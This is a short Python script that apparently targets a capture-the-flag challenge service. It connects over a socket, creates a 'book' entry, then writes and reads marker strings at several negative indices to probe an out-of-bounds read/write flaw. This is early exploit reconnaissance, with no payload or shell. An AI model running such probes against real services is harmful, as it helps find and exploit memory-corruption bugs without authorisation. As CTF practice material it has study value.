import socket
import time
import binascii

HOST = "host5.metaproblems.com"
PORT = 5020

CAND = [-1, -3, -5, -7, -9, -4, -6, -8]


def recv_all(s, timeout=1.0):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    return data


def test_index(idx):
    try:
        s = socket.create_connection((HOST, PORT), timeout=8)
    except Exception as e:
        print("connect failed", e)
        return
    print("\n[*] testing idx", idx)
    print(recv_all(s, 1).decode(errors="ignore"))
    # create a book (so books[0] exists)
    s.sendall(b"1\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.2)
    s.sendall(b"X\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.2)
    s.sendall(b"1\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.2)
    # write to idx
    s.sendall(b"2\n")
    time.sleep(0.02)
    _ = recv_all(s, 0.1)
    s.sendall(str(idx).encode() + b"\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.2)
    marker = f"MK{idx}\n".encode()
    s.sendall(marker)
    time.sleep(0.15)
    print("[*] wrote marker")
    # read same idx
    s.sendall(b"3\n")
    time.sleep(0.02)
    _ = recv_all(s, 0.1)
    s.sendall(str(idx).encode() + b"\n")
    time.sleep(0.2)
    data = recv_all(s, 0.5)
    print("read len", len(data))
    try:
        print(data.decode(errors="ignore")[:400])
    except Exception:
        print("hex", binascii.hexlify(data)[:200])
    s.close()


for i in CAND:
    test_index(i)
    time.sleep(0.2)
